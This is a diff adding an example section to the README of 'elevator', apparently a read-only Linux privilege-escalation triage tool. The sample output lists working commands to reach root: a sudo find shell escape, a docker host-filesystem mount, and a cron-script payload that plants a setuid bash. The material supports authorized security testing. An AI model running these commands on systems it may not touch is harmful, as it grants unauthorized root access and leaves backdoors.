@@ -50,6 +50,42 @@ CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -ldflags="-s -w" -o elevator-arm6
 Each finding prints the evidence (what was detected), the exact command for **you**
 to run, a confidence and blast-radius rating, and a reference. You decide and run it.
 
+## Example
+
+```text
+$ elevator
+elevator — read-only privesc triage. Emits commands for YOU to run; it does not exploit. Authorized use only.
+
+Found 3 candidate route(s), ranked:
+
+[1] Sudo-runnable find — GTFOBins shell escape
+    category=sudo  confidence=high  blast=safe
+    evidence : sudo -l: (root) NOPASSWD: /usr/bin/find
+    run      :
+      sudo /usr/bin/find . -exec /bin/sh \; -quit
+    ref      : https://gtfobins.github.io/gtfobins/find/
+
+[2] Member of 'docker' group — mount host filesystem as root
+    category=group  confidence=high  blast=safe
+    evidence : current user is in group 'docker'
+    run      :
+      docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+    ref      : https://gtfobins.github.io/gtfobins/docker/
+
+[3] Writable file run by root cron: /opt/maint/cleanup.sh
+    category=cron  confidence=high  blast=reversible
+    evidence : root-run cron script is writable: /opt/maint/cleanup.sh
+    run      :
+      # back up /opt/maint/cleanup.sh, append a root payload, e.g.:
+      #   echo 'cp /bin/bash /tmp/.b && chmod +s /tmp/.b' >> /opt/maint/cleanup.sh
+      # wait for the schedule, then:  /tmp/.b -p
+    ref      : https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-jobs
+```
+
+The banner is written to stderr; the report (or `-json`) goes to stdout, so
+`elevator -json > routes.json` captures just the findings. elevator stops here —
+it prints the routes and the commands; running them is up to you.
+
 ## Checks (current)
 
 - **sudo** — parses `sudo -n -l` (a read-only listing; it never runs a sudo command)
